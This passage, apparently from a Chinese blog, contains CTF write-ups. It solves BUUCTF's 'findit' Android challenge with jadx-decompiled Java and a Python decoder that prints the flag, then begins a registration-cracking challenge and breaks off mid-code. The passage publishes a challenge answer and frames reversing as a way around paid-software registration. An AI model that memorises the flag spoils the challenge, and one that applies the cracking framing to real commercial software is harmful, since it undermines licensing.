title="buu、findit"></a>buu、findit</h3><p><strong>题目描述</strong></p><p>不知不觉，小明长大了，变成了一个程序员，虽然很苦逼，但是偶尔编写个小东西坑害公司新人还是蛮好玩的。新人小萌一天问小明wifi账号密码，一分钟后，小萌收到了一个文件。小萌想了好久都没得到密码，怎么办，女朋友要买东西，流量告罄，没wifi上不了网，不买就分手，是时候该展现月老的实力了兄弟们！代表月亮惩罚小明！得出答案。 注意：得到的 flag 请包上 flag{} 提交</p><p><a href="https://files.buuoj.cn/files/7b8602971727c6c82ec0d360d5cad2c0/6a428ff2-25d7-403c-b28e-3f980a10a5a2.apk?token=eyJ1c2VyX2lkIjo1ODI5LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMTV9.YLL-JQ.1mkBIGgecp2UxMwmP7W7hIN_9NM"> buu在线题目附件地址</a></p><p><strong>解题过程</strong></p><p>给出的是一个apk文件，遇到这种先在模拟器中打开看一看软件的主要逻辑。</p><p><img src="/2021/05/28/CTF/image-20210530102603082.png" alt="image-20210530102603082"></p><p>看这种感觉应该是内部已经生成答案了，但是就是没显示出来。用jadx打开之后找到MainActivity函数，反编译出来的java代码如下所示</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>findit</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>os<span class="token punctuation">.</span></span><span class="token class-name">Bundle</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>support<span class="token punctuation">.</span>v7<span class="token punctuation">.</span>app<span class="token punctuation">.</span></span><span class="token class-name">ActionBarActivity</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">MenuItem</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>view<span class="token punctuation">.</span></span><span class="token class-name">View</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">Button</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">EditText</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>widget<span class="token punctuation">.</span></span><span class="token class-name">TextView</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">ActionBarActivity</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* access modifiers changed from: protected */</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity, android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> savedInstanceState<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>savedInstanceState<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">EditText</span> edit <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">TextView</span> text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TextView</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>widget3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View</span><span class="token punctuation">.</span><span class="token class-name">OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.example.findit.MainActivity.1</span>            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> y <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">17</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'I'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'i'</span> <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token string">'\b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">MenuItem</span> item<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>action_settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测下面这段应该是获得flag 的关键<code>text.setText(String.valueOf(y));</code>这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面给出解密用的python代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Z'</span> <span class="token operator">&lt;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>            y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注册程序的破解-CTF向-1"><a href="#注册程序的破解-CTF向-1" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id="buu、简单注册器"><a href="#buu、简单注册器" class="headerlink" title="buu、简单注册器"></a>buu、简单注册器</h3><p><strong>题目描述</strong></p><p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交</p><p><strong>解题过程</strong></p><p>看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token string">"dd2940c04462b4dd7c450528835cca15"</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token 